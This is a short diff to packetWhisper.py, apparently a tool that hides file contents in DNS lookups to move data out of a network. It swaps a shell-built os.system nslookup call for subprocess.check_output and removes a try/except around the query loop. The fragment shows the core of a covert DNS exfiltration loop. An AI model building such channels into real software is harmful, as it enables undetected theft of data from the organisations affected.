@@ -57,7 +57,7 @@
 #   $ python packetWhisper.py 
 # 
 
-import os, sys, getopt, socket, re, random, datetime, time, cloakify, decloakify
+import os, subprocess, sys, getopt, socket, re, random, datetime, time, cloakify, decloakify
 
 # Set name of knock sequence string (this is only used when transmitting Common FQDN ciphers)
 
@@ -611,16 +611,10 @@ def GenerateDNSQueries( cloakedFile, queryDelay ):
 
 			fqdnStr = fqdn.strip()
 			
-			try:
-				commandStr = "nslookup " + fqdnStr + " >/dev/null 2>&1"
-				os.system( commandStr )
+			ret = subprocess.check_output( ['nslookup', fqdnStr] )
 
-				time.sleep( queryDelay )   
+			time.sleep( queryDelay )   
 		
-			except:
-				time.sleep( queryDelay )  
-
-
 			checkpoint = byteCount % 25
 
 			if byteCount > 0 and checkpoint == 0:
